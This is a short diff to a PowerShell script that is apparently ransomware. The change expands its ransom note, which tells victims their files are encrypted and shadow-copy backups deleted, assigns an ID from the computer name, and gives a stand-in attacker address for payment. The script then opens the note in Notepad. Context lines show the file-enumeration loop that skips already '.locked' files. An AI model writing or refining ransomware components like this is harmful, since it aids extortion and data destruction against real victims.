@@ -21,7 +21,16 @@ Get-ChildItem -Path $ResolvedPath -File -Exclude "READ_ME_NOW.txt","*.locked","e
     }
 }
 
-"YOUR FILES ARE ENCRYPTED. CONTACT: ATTACKER@DARKWEB.COM" | Set-Content $ransomNotePath
+# The Ransom Note (Formatted for internal string use)
+$note = "--- >>> ALL YOUR FILES ARE ENCRYPTED <<< ---`r`n`r`n"
+$note += "Your network has been breached and all data has been encrypted.`r`n"
+$note += "Your backups (Shadow Copies) have been successfully deleted.`r`n`r`n"
+$note += "[ YOUR PERSONAL IDENTIFIER ]`r`n$($env:COMPUTERNAME)-1024`r`n`r`n"
+$note += "[ INSTRUCTIONS ]`r`n"
+$note += "1. Contact attacker@darkweb.com for payment details.`r`n"
+$note += "2. Provide your Personal ID in the subject line."
+
+$note | Set-Content $ransomNotePath
 Start-Process notepad.exe $ransomNotePath
 '
 
